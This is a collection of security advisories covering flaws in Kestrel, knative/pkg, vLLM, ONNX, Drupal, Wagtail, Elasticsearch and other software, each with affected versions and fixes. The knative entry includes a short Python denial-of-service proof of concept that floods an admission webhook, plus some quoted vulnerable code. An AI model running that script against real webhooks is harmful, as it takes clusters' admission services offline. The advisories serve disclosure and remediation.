items.description: ## Executive summary Microsoft is releasing this security advisory to provide information about a vulnerability in ASP.NET Core's Kestrel Named Pipes transport. This advisory provides guidance on updating affected applications and components. A Kestrel named-pipe listener configured with `CurrentUserOnly` can lose protected namespace ownership during recovery, allowing another local user to claim the pipe path. ## Announcement Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/507 ## CVSS Details - **Version:** 3.1 - **Severity:** High - **Score:** 7.5 (base score) - **Vector:** `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N/E:U/RL:O/RC:C` - **Weakness:** CWE-362 - **MSRC severity:** Important - **Impact:** Security Feature Bypass ## Affected Platforms - **Platforms:** Windows - **Architectures:** Arm64, x64, x86 ## Affected Packages Microsoft.AspNetCore.Server.Kestrel.Transport.NamedPipes ships in the ASP.NET Core shared framework and runtime packs; it is not a separately packable NuGet package. Affected intervals and patched release versions are listed below. ### .NET 8.0 - affected runtime packages Package | Affected version | Patched version --- | --- | --- [Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34 [Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34 [Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34 ### .NET 9.0 - affected runtime packages Package | Affected version | Patched version --- | --- | --- [Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23 [Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23 [Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23 ### .NET 10.0 - affected runtime packages Package | Affected version | Patched version --- | --- | --- [Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15 [Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15 [Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15 ### .NET 11.0 - affected runtime packages Package | Affected version | Patched version --- | --- | --- [Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0 [Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0 [Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0 The .NET 11.0.0 release is fixed; affected prereleases are listed above. ## Advisory FAQ ### How do I know if I am affected? Review Windows applications that use Kestrel's Named Pipes transport and identify their deployed ASP.NET Core versions. Compare deployed versions with the affected intervals above. Self-contained applications include their own framework; updating a machine-wide installation does not replace their embedded copies. ### How do I fix the issue? Install the applicable ASP.NET Core runtime update and restart applications. Rebuild and redeploy affected self-contained applications with fixed runtime packs. An SDK update alone does not replace runtime or framework files already embedded in deployed applications. Use the patched version listed for the affected servicing line. ## Other Information ### Reporting Security Issues If you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new). Further information can be found in the MSRC [Report an Issue FAQ](https://www.microsoft.com/msrc/faqs-report-an-issue). Security reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty. ### Support You can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue. ### Disclaimer The information provided in this advisory is provided "as is" without warranty of any kind. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply. ### External Links [CVE-2026-114157](https://www.cve.org/CVERecord?id=CVE-2026-114157) ### Acknowledgements - Antonio Alonso-Stepanov ### Revisions V1.0 (November 10, 2026): Advisory published.

Allocation of Resources Without Limits or Throttling (CWE-770) in Elasticsearch can lead to denial of service via a specially crafted input value that is processed by an affected phonetic encoder of the analysis-phonetic plugin. An authenticated user with permission to write documents to or run searches against an index that uses an affected encoder can cause an Elasticsearch node to exhaust its heap memory. The node can become unresponsive or terminate.

Tandoor Recipes is an application for managing recipes, planning meals, and building shopping lists. Prior to 2.6.10, passes unvalidated sort_order and order_field strings into Django ORM order_by() calls when an authenticated user supplies foreign-key traversal paths in recipe search, RecipeBook, or stored CustomFilter ordering values. Request processing uses _finalize_ordering and order_by through 8080/api/recipe/ and 8080/api/recipe-book/. The attack works because Django interprets double-underscore ordering fields as related-table traversal, and observable result ordering leaks values from related User fields. This can infer password hashes, email addresses, administrator status, and other related database values. This issue is fixed in version 2.6.10.
PostgreSQL Anonymizer doesn't mask data returned by a sub-query in a rule. The problem is resolved in PostgreSQL Anonymizer 3.3.0 and later versions.

PostgreSQL Anonymizer contains a vulnerability related to anonymization functions defined using SQL-standard function bodies. PostgreSQL analyses such functions at declaration time, while Anonymizer only attempts to check them at execution time. This problem can be exploited by any user with the TEMPORARY privilege. The issue is fixed in PostgreSQL Anonymizer 3.3.0 and later versions.

items.title: knative.dev/pkg admission webhooks allow unbounded request-body memory exhaustion
items.description:
## ⚠️ Update (verification, 2026-05-19): C-2 confirmed end-to-end — **4.5× amplification observed** (worse than the advisory's conservative 2× claim)

Built a Go PoC ([`cmd/poc-c2/main.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/cmd/poc-c2/main.go)) that runs the exact 8-line vulnerable snippet from [`webhook/admission.go:109-117`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go#L109-L117) verbatim under the same `http.HandlerFunc` shape (the full production `admissionHandler` at `:85` requires `*Webhook` + `AdmissionController` + an informer-synced channel + controller-runtime / client-go scaffolding — the bug is the missing `http.MaxBytesReader`, nothing else in the handler). Bound to `127.0.0.1:18098`.

PoC client streamed 2 GiB of `a` bytes over a raw TCP socket. `runtime.MemStats.HeapAlloc` sampler:

```
baseline:  HeapAlloc =     0.32 MiB
peak:      HeapAlloc = 9 217.38 MiB  =  9.00 GiB
ratio:     4.50× the body size
```

The advisory predicted ~2× from `io.TeeReader` doubling the body once in `bodyBuffer`. The observed 4.5× ratio comes from the interaction of two amplifiers: `bytes.Buffer.ReadFrom` (used by `TeeReader`-fed `bodyBuffer`) doubles its backing slice on every grow, so peak occupancy during a realloc is `old + new = 3×` the live data — and `json.Decoder` holds its own working buffer in parallel. The advisory's 2× floor is comfortably exceeded.

**Downstream impact reminder**: this library backs every Knative serving / eventing controller, every Tekton Triggers / Pipelines webhook, KEDA, Sigstore policy-controller, Kpack, and many more. A 2 GiB body to **any** of those projects' admission webhook ports OOMs the controller at 4.5× the body — i.e., even a 128 MiB request OOMs a 512 MiB-limited Pod.

---

# Summary

`knative.dev/pkg`'s admission webhook handler reads the incoming HTTP request body via `json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer))` with **no `http.MaxBytesReader` wrapping the body**. Because every consumer of `knative.dev/pkg/webhook` inherits this handler (Knative serving / eventing, Tekton Pipelines, KEDA, Sigstore policy-controller, and others), a single oversized POST to **any of those projects' admission webhook ports** drives the controller pod into memory exhaustion and OOM-kill. Worse, the `io.TeeReader` design keeps a verbatim copy of the body in `bodyBuffer` while the decoder also materializes the parsed struct — so the peak memory usage is roughly **twice the body size**.

This is the same shape as **CVE-2026-24514** (ingress-nginx) and `GHSA-9539-c3xr-w9vm` (Kyverno admission body OOM) filed today against the same antipattern.

# Affected versions

- `knative.dev/pkg` — `main` HEAD on `github.com/knative/pkg` (verified 2026-05-18 against [`webhook/admission.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go) sha `1ad5a1ce0ee7043081cb50fd1acc6d36a9126844`).
- Every release that ships the current [`webhook/admission.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go) handler.

# Vulnerable code

[`webhook/admission.go:109-117`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go#L109-L117):

```go
review := admissionv1.AdmissionReview{}
var bodyBuffer bytes.Buffer
if err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {
    http.Error(w, fmt.Sprintf("could not decode body: %v", err), http.StatusBadRequest)
    return
}
```

There is no `http.MaxBytesReader` around `r.Body`. The standard library's `json.NewDecoder` will read until EOF or the matching closing `}`. The `io.TeeReader` simultaneously copies every byte read from `r.Body` into `bodyBuffer`, which the rest of the handler uses for the response trailer / observability.

# Downstream impact (the reason this matters)

`knative.dev/pkg/webhook` is the **default admission-webhook scaffolding for the entire Knative + CNCF webhook ecosystem**:

| Consumer | Repo | Webhook surface |
|---|---|---|
| Knative serving | `knative/serving` | resource validation / defaulting |
| Knative eventing | `knative/eventing` | resource validation / defaulting |
| Tekton Pipelines | `tektoncd/pipeline` | Pipeline / Task / TaskRun validation |
| Tekton Triggers | `tektoncd/triggers` | EventListener / Trigger validation |
| KEDA | `kedacore/keda` | ScaledObject / ScaledJob validation |
| Sigstore policy-controller | `sigstore/policy-controller` | ClusterImagePolicy mutating + validating |
| Kpack | `buildpacks-community/kpack` | Image / Builder validation |
| ... | | |

Every one of these consumers ships the same `io.ReadAll`-equivalent body read with **no upper bound**. A pod-network-reachable attacker can OOM-kill any of them with a single large POST. `failurePolicy=Fail` admission webhooks (the secure-default) then take the namespace's or cluster's admission flow offline until the controller restarts.

# Impact

- **Class**: CWE-770 unbounded allocation. Reachable from any pod-network client.
- **Severity per consumer**: depends on how each consumer configures `failurePolicy`. For projects with `failurePolicy=Fail` (e.g., Sigstore policy-controller's image-policy enforcement), the consequence is cluster-wide admission outage. For `failurePolicy=Ignore`, the consequence is "this project's webhook is offline" but the API server continues admitting requests.
- **Severity**: matches the broader CVE-2026-24514 / GHSA-9539-c3xr-w9vm. Single-packet DoS on the library; each downstream consumer inherits the bug.

# Reproduction

The exact same PoC built against Kyverno's admission handler reproduces this:

```python
import socket
total = 2 << 30   # 2 GiB
s = socket.create_connection(('<knative-or-tekton-webhook-host>', 8443))
s.sendall(b'POST /<admission-path> HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % total)
chunk = b'a' * (1 << 20)
for _ in range(total >> 20): s.sendall(chunk)
```

Observed against the Kyverno admission handler (same antipattern):

```
baseline:        HeapAlloc=7 MiB     Sys=22 MiB
after read:      HeapAlloc=9500 MiB  Sys=9548 MiB  (4 GiB body → 9.5 GiB peak; io.TeeReader doubles)
```

For the knative/pkg version, the `io.TeeReader` doubles the resident memory (one copy in the decoder's accumulating slice, one in `bodyBuffer`). A `kyverno-admission-controller`-equivalent Pod with a 256 MiB memory limit OOM-kills with ~128 MiB of body.

# Suggested fix

Wrap the request body with `http.MaxBytesReader` (and add a `http.StatusRequestEntityTooLarge` branch on the `MaxBytesError` path):

```go
const maxAdmissionRequestSize = 8 << 20 // 8 MiB — controller-runtime's default; large enough for Kubernetes' own admission objects
r.Body = http.MaxBytesReader(w, r.Body, maxAdmissionRequestSize)
var bodyBuffer bytes.Buffer
review := admissionv1.AdmissionReview{}
if err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {
    var mbe *http.MaxBytesError
    if errors.As(err, &mbe) {
        http.Error(w, "admission body exceeds maximum size", http.StatusRequestEntityTooLarge)
        return
    }
    http.Error(w, fmt.Sprintf("could not decode body: %v", err), http.StatusBadRequest)
    return
}
```

This propagates a fix to **every downstream consumer** with no API change, and the cap can be made configurable per-server via a new field on the `webhook.Options` struct.

# Disclosure

Reporting privately under your security policy. No public disclosure on my side until you have a fix or coordinated timeline. Encourage maintainers to coordinate with downstream consumers (Knative, Tekton, KEDA, Sigstore) on simultaneous release.

# Reporter

tonghuaroot (tonghuaroot@gmail.com)

Not Failing Securely ('Failing Open') vulnerability in Apache Tomcat. If the OpenSSLLifecycleListener is configured to use FIPS mode but FIPS activation fails, Tomcat logs and error but continues to use JSSE in non-FIPS mode with the provided configuration.



This issue affects Apache Tomcat: from 11.0.0-M14 through 11.0.26, from 10.1.22 through 10.1.60, from 9.0.92 through 9.0.122.



Users are recommended to upgrade to version 11.0.27, 10.1.61 or 9.0.123, which fix the issue.

Insertion of Sensitive Information Into Sent Data (CWE-201) in Kibana Observability onboarding can lead to disclosure of the credentials that Kibana uses to connect to Elasticsearch. When these credentials are embedded in the Elasticsearch host URLs in the Kibana configuration, an authenticated user with the privileges to onboard Observability data can obtain them. The user can then access Elasticsearch directly with the privileges of the Kibana service account, which are outside the privileges granted to that user.

Improper Neutralization of Input During Web Page Generation ("Cross-site Scripting") vulnerability in Drupal Drupal core allows Cross-Site Scripting (XSS). This issue affects Drupal core versions: from 10.3.0 to 10.6.19, from 11.0.0 to 11.3.19, from 11.4.0 to 11.4.10, from 12.0.0-alpha1 to 12.0.0-beta2.

Improper Neutralization of Input During Web Page Generation ("Cross-site Scripting") vulnerability in Drupal Drupal core allows Cross-Site Scripting (XSS). This issue affects Drupal core versions: from 8.9.0 to 10.6.19, from 11.0.0 to 11.3.19, from 11.4.0 to 11.4.10, from 12.0.0-alpha1 to 12.0.0-beta2.

Wagtail is an open source content management system built on Django. Prior to 7.0.9, 7.3.4, 7.4.3, and 8.0rc2, a Wagtail CMS user with the submit translations permission can call the Admin API copy for translation action for a source page that the user cannot edit. The action copies the inaccessible page into a translation, allowing the user to view its contents despite the missing source-page edit permission. This issue is fixed in versions 7.0.9, 7.3.4, 7.4.3, and 8.0rc2.

Wagtail is an open source content management system built on Django. Prior to 7.0.9, 7.3.4, 7.4.3, and 8.0rc2, a CMS user who has add permission for a snippet model but lacks change and view permission for an existing snippet can access the snippet copy view and copy that source object. The copy operation reveals the contents of a snippet that the user is not authorized to view. This issue is fixed in versions 7.0.9, 7.3.4, 7.4.3, and 8.0rc2.

pgEdge Postgres MCP Server enables SQL queries against PostgreSQL databases through Model Context Protocol compatible clients. Prior to 1.1.0, the where parameter of the count_rows tool accepted subqueries against tables other than the table named in the tool call. A caller could use predicates and the returned row count as an inference oracle to extract data from any other table that the connected database role could read. The database privilege boundary remained intact, and the flaw did not grant access to tables outside that role's existing SELECT privileges. This issue is fixed in version 1.1.0.

A cleartext storage flaw was found in the AAP Gateway Operator. When reconciling an AutomationController, the operator reads the protected resource-server Secret (Secret/<aap-name>-resource-server, key controller_resource_server_secret) and copies its plaintext value into the generated AutomationController custom resource under spec.extra_settings (RESOURCE_SERVER.SECRET_KEY). Although the operator uses no_log to keep the value out of its own logs, serializing it into the custom resource exposes it to any principal able to read the AutomationController CR without permission to read the backing Kubernetes Secret, breaking the expected OpenShift RBAC separation between the two resources. The value may also propagate into Kubernetes API/etcd storage, GitOps and Argo diffs and history, rendered manifests, support bundles, and audit data. The resource-server secret is intended for trusted Gateway-to-Controller service authentication, and its disclosure may allow a user to impersonate a trusted Controller service and reach privileged service-index APIs.

Grafana is an open-source platform for monitoring and observability.

When an Elasticsearch data source is configured with a time-based index pattern, Grafana
generated one index name for every interval in the requested query time range without any upper
limit. A user with permission to query the data source, which includes users holding only the
Viewer role in a default configuration, could submit a single small query with an extreme time
range and cause the server to allocate memory until it was terminated. The allocation occurred
before any request was sent to Elasticsearch, so the condition applied whether or not the
Elasticsearch cluster was reachable.

Data sources configured with a static index name are not affected.

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: Server: Replication).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.13, 9.7.0-9.7.4, 26.10; MySQL Cluster: 8.0.0-8.0.50, 8.4.0-8.4.13, 9.7.0-9.7.4 and  26.10. Easily exploitable vulnerability allows low privileged attacker with network access via multiple protocols to compromise MySQL Server, MySQL Cluster.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server, MySQL Cluster. CVSS 3.1 Base Score 6.5 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).

Missing authorization in Kibana Security AI Assistant conversation deletion can allow an authenticated user with access to the assistant to delete other users' conversations in the same space. The delete-all operation can issue a query without an ownership filter using the assistant's internal Elasticsearch client. A user can consequently delete conversation history that they do not own or have permission to modify.

Uncontrolled resource consumption in Elasticsearch query parsing can lead to denial of service. An authenticated user with search permissions can submit a specially crafted query containing an excessive number of clauses. Expanding those clauses in memory before enforcing query complexity limits can exhaust heap memory and crash an Elasticsearch node.

An issue was discovered in Elasticsearch where specially crafted compressed payloads can cause an infinite loop. A low-privileged authenticated user can submit a malformed payload to a product API endpoint that causes the node to enter a permanent CPU loop, occupying a request-processing thread indefinitely. This can progressively exhaust the node's processing capacity, degrading or denying access to product features, and requiring a restart of the affected node to recover.

Laradocs maintains version-controlled documentation inside a Laravel codebase. From version 0.4.0 to before version 1.0.0, Laradocs is vulnerable to local command injection in server-side KaTeX rendering via an unescaped Node.js binary path in a proc_open() command string. This issue has been patched in version 1.0.0.

items.title: vLLM denial of service via prompt embeds on XD-RoPE models (incomplete fix of CVE-2026-55514)
items.description:
### Summary

An unauthenticated remote attacker can crash the entire vLLM engine and API server with a single `/v1/completions` request that contains only `prompt_embeds` (no `prompt` text and no `prompt_token_ids`) when the server runs an XD-RoPE model (HF config with `rope_scaling.type == "xdrope"`, e.g. `tencent/HunyuanOCR`) with `--enable-prompt-embeds` on the V1 (MRV1) GPU model runner. The crash is caused by a reachable type-narrowing `assert` in `GPUModelRunner._init_xdrope_positions` that is the **unpatched XD-RoPE sibling of CVE-2026-55514 / GHSA-33cg-gxv8-3p8g** ("vLLM DoS via prompt embeds on M-RoPE models", fixed in v0.24.0 by commit `470229c37`): that fix removed the identical assertion from `_init_mrope_positions` and added a regression test, but the XD-RoPE path was missed and still asserted on `main` at the time of this report. Verified end-to-end on the released `vllm==0.28.0` wheel on a real GPU: one attack request makes the whole server process terminate (all concurrent clients disconnected).

### Details

**Affected code** (`vllm/v1/worker/gpu_model_runner.py`, V1 GPU model runner; lines 1742–1746 in v0.28.0, 1689–1694 in `main` @ `6f7df92a8`):

```python
def _init_xdrope_positions(self, req_state: CachedRequestState):
    model = self.get_model()
    xdrope_model = cast(SupportsXDRoPE, model)
    assert req_state.prompt_token_ids is not None, (      # <- fatal assert
        "XD-RoPE requires prompt_token_ids to be available."
    )
    ...
```

It is invoked for **every newly scheduled request** whenever the model is detected as XD-RoPE (`model_config.uses_xdrope_dim > 0`, derived from the HF config fields `xdrope_section` or `rope_scaling.xdrope_section`; see `vllm/transformers_utils/config.py:580-594`):

```python
# update_requests() in gpu_model_runner.py
if self.uses_xdrope_dim > 0:
    self._init_xdrope_positions(req_state)
```

**Root cause.** The assertion is a mypy type-narrowing guard that is not always true: an embeddings-only request legitimately reaches the worker with `prompt_token_ids = None`. This is the exact defect described by GHSA-33cg-gxv8-3p8g for the M-RoPE sibling; the June 2026 fix (commit `470229c37`, released in v0.24.0) removed the assertion only on the M-RoPE path and its regression test (`tests/v1/worker/test_mrope_prompt_embeds.py`) covers only M-RoPE.

**Why the request reaches the assertion (verified call chain):**
1. `vllm/renderers/embed_utils.py:17-38` — `safe_load_prompt_embeds` validates only tensor shape/dtype (requires the server flag `--enable-prompt-embeds`), no token ids required.
2. `vllm/v1/engine/input_processor.py:343-346` — the "embeds" input type is accepted with `prompt_token_ids = None`; `_validate_model_input` imposes no token-id requirement.
3. `vllm/v1/request.py:145-146` — embeddings-only requests are first-class (`_all_token_ids` is a zero-filled placeholder list).
4. On first scheduling, `_update_states()` → `update_requests()` → `_init_xdrope_positions(req_state)` raises `AssertionError` inside the EngineCore execution loop. In the default in-process worker deployment the EngineCore dies; the API server then shuts down, dropping every in-flight request of all tenants.

**Affected configuration surface.** The V1 model runner is selected (and the assertion thus reachable) in many supported configurations, including: `VLLM_USE_V2_MODEL_RUNNER=0`, environments without Triton, ROCm-specific architectures, `--speculative-config "method=ngram_gpu"`, P-EAGLE parallel drafting, EAGLE3 with pipeline parallelism > 1, PP with `external_launcher`, sequence parallelism with TP > 1, `stock torch.compile`, DBO, elastic expert parallelism, custom logits-processor plugins, and KV-sharing fast prefill (selection logic: `vllm/config/vllm.py:620-652, 2396-2490`).

**End-to-end observation (2026-08-28, NVIDIA RTX PRO 6000, `vllm==0.28.0` PyPI wheel).** Real server log excerpt on a single attack request:

```
(EngineCore) ERROR [core.py:1348]   File ".../vllm/v1/worker/gpu_model_runner.py", line 1745, in _init_xdrope_positions
(EngineCore) ERROR [core.py:1348]     assert req_state.prompt_token_ids is not None, (
(EngineCore) ERROR [core.py:1348]            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
(EngineCore) ERROR [core.py:1348] AssertionError: XD-RoPE requires prompt_token_ids to be available.
(APIServer) ERROR [async_llm.py:744] vllm.v1.engine.exceptions.EngineDeadError: EngineCore encountered an issue...
(APIServer) INFO  [async_llm.py] ... Application shutdown complete
(APIServer) INFO  [api_server.py] Finished server process
```

Immediately after the request: `GET /health` fails — the whole server process is dead. Control group on the same server: a normal request with `prompt` token ids completes and the server stays alive.

### Impact

- **Vulnerability type:** reachable assertion leading to full denial of service (CWE-617). One request kills the EngineCore and terminates the API server process; every concurrent client is disconnected and the service must be restarted.
- **Impact:** availability of the entire serving instance; for multi-tenant deployments, all tenants are affected simultaneously.
- **Who is impacted:** any deployment that (a) serves an XD-RoPE model (`rope_scaling.type == "xdrope"`), (b) enables `--enable-prompt-embeds`, and (c) uses the V1 model runner (common supported configurations listed in Details). The attack needs no authentication when the API is exposed without `--api-key` and also works on unauthenticated inference aliases (e.g. `/invocations`); with `--api-key`, any authorized API caller can trigger it.
- **Same-class reference:** CVE-2026-55514 / GHSA-33cg-gxv8-3p8g (M-RoPE variant, rated High); this report is the incomplete-fix variant of that advisory.

### Suggested fix (for the maintainer)

Mirror commit `470229c37` in `_init_xdrope_positions` — replace the assertion with embeddings-aware handling:

```python
if req_state.prompt_token_ids is not None:
    input_tokens = req_state.prompt_token_ids
elif req_state.prompt_embeds is not None:
    seq_len = req_state.prompt_embeds.shape[0]
    input_tokens = list(range(seq_len))
else:
    raise ValueError("XD-RoPE requires either prompt_token_ids or prompt_embeds.")
```

and add a regression test equivalent to `tests/v1/worker/test_mrope_prompt_embeds.py` for the XD-RoPE path (optionally, raise `ValueError` instead of asserting so the request fails cleanly without killing the engine).

## Affected versions

- Package: `vllm` (PyPI).
- Affected versions: `>= 0.28.0, < 0.30.0`.
- First stable patched version: `0.30.0`.

The range covers the verified affected release and subsequent releases before the fix; earlier releases were not comprehensively assessed. PR #56078 removed the separate XD-RoPE path by unifying it with M-RoPE.

Advisory fixed in [#56078](https://github.com/vllm-project/vllm/pull/56078).

WeGIA is a web manager for charitable institutions. Prior to 3.8.7, a stored DOM cross-site scripting vulnerability in `web/html/memorando/listar_despachos.php` results from unsafe handling of the `texto` field. The affected flow spans `web/controle/memorando/DespachoControle.php` and `web/dao/memorando/DespachoDAO.php`: `FILTER_SANITIZE_SPECIAL_CHARS` is applied during storage, but `html_entity_decode()` later decodes the stored content and `jQuery .html()` inserts the result into the DOM. An attacker able to submit a memorandum dispatch through `/controle/control.php` using `DespachoControle` and `metodo=incluir` can store malicious HTML or JavaScript. The code executes automatically when another user views the memorandum thread through `/html/memorando/listar_despachos.php` with `id_memorando`. This permits arbitrary JavaScript execution, theft of administrator `PHPSESSID` session tokens, privileged session hijacking, account takeover, and unauthorized access to privileged or internal functionality. This issue is fixed in version 3.8.7.

vLLM from 0.8.5 before 0.31.0 has a denial of service flaw. LogprobsTensors.empty_cpu() in vllm/v1/outputs.py allocates an uninitialized int32 tensor, and the V1 model runner leaves prompt positions reported as computed by a KV connector unwritten. A client sharing the engine can send prompt_logprobs (or echo with logprobs) against a connector-cached prefix, making tokenizer decode raise OverflowError, which crashes EngineCore and drops all co-tenant requests.

Connaisseur is an admission controller that integrates container image signature verification into a Kubernetes cluster. Prior to 3.11.1, the Cosign validator counts valid signature layers rather than distinct trust roots for trustRoot: "*" policies using an explicit threshold or an implicit require-all policy. An attacker who controls one configured trust root's signing key and can attach multiple signatures to an image can satisfy a threshold intended to require multiple independent roots, causing admission without the intended signer quorum. Policies using a single trust root or the required option are not affected. This issue is fixed in 3.11.1.

A flaw in the Node.js `zlib.ZipFile` API can cause it to return bytes that do not belong to the requested entry after the local and central header validation fails.

When `zipEntry.modified` is read on an archive whose local header does not match its central directory, either directly or while compacting the archive, the validation error is caught but the parsed local header is left cached without a content offset. A later content read then returns attacker-controlled bytes from the start of the file instead of rejecting the archive, and CRC-32 verification still passes because the attacker controls the central directory CRC. A Node.js-based scanner can therefore approve different content from what another ZIP implementation extracts from the same archive.

This vulnerability affects Node.js **26.x**.

Use of externally-controlled format string in PostgreSQL pg_basebackup allows an attacker having already compromised a server to achieve disclosure from pg_basebackup memory, via backup manifest bytes.  The vulnerability does not return the improperly-read bytes back to the attacker's server, so a successful attack would need separate implementation-specific secrets for that.  Integrity impact is unlikely; in particular, the applicable formatter does not support %n.  Versions before PostgreSQL 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.

items.title: ONNX: Out-of-Bounds Read in RNN/GRU/LSTM Shape Inference (Old Opsets, Missing Rank Check)
items.description:
## Summary

ONNX shape inference performed an out-of-bounds read when processing a malformed RNN, GRU, or LSTM node from opsets 1–6 whose first input had a rank other than three.

`RNNShapeInference_opset1_to_6()` checked whether the input shape was present but accessed `dim(0)` and `dim(1)` without first checking its rank. A crafted model could therefore terminate a process that called `onnx.shape_inference.infer_shapes()`. The model passed `onnx.checker.check_model()` before reaching the vulnerable path.

## Technical details

The vulnerable code read dimensions unconditionally:

```cpp
if (hasInputShape(ctx, 0)) {
  const auto& first_input_shape = getInputShape(ctx, 0);
  seq_length = first_input_shape.dim(0);
  batch_size = first_input_shape.dim(1);
}
```

For an undersized shape, protobuf's repeated-field access read outside the intended array in release builds. The observed result was SIGSEGV; sanitizer and debug builds terminated on a protobuf bounds check.

The newer opset 7–13 and opset 14+ inference paths already required the first input to have rank three and were not affected.

## Impact

An application that performs shape inference on an untrusted model can be terminated, causing denial of service. Exploitation does not require privileges or human interaction once the model is processed. No confidentiality or integrity impact was demonstrated.

## Affected versions

- Affected: ONNX through 1.21.0
- Patched: ONNX 1.22.0

The vulnerable schemas are limited to RNN and LSTM opsets 1–6 and GRU opsets 3–6.

## Remediation

Upgrade to ONNX 1.22.0 or later. The fix validates that the first input has rank three before accessing its dimensions.

- Fix: [onnx/onnx#7879](https://github.com/onnx/onnx/pull/7879)
- Commit: [`92e541266`](https://github.com/onnx/onnx/commit/92e541266af5dd38cfa48aeb92206f4268a066cd)

The original malformed model was also re-tested against the published ONNX 1.23.2 wheel and correctly raises `InferenceError`.

## Severity

The vulnerable ONNX component processes the malicious model through a local library API or file boundary and is not itself bound to a network stack. Applications that expose ONNX model processing over a network should calculate an Environmental score with Modified Attack Vector set to Network.

items.title: @better-auth/drizzle-adapter: Concurrent requests can exceed rate limits on PostgreSQL
items.description:
## Am I affected?

You are affected if you use `@better-auth/drizzle-adapter` from 1.6.17 through versions before 1.7.7 (including the 1.7.0 prereleases from beta.6 through rc.6) or `@better-auth/kysely-adapter` 1.6.17 through 1.6.31, and keep rate-limit records in a PostgreSQL database.

All of these must be true:

- Rate limiting is enabled.
- Rate-limit records are stored in the database.
- The database is PostgreSQL, used through one of the adapter versions above.

You are not affected if you store rate-limit records in memory (the default) or in secondary storage.

## Summary

Database-backed rate limiting on PostgreSQL can let a burst of concurrent requests go over the configured maximum. When many requests arrive at the same time, several of them can pass the limit check together. This weakens the rate limit on password sign-in, two-factor verification, one-time codes, password resets, and other rate-limited endpoints.

## Impact

An attacker who sends many requests at once can make more attempts than the application allows.

The issue does not bypass password or one-time-code validation. It does not directly compromise an account. The number of extra attempts is limited by the number of concurrent database connections, the number of application instances, and the rate-limit window.

## Patches

`@better-auth/kysely-adapter` is fixed in 1.7.0. Upgrade to 1.7.0 or later.

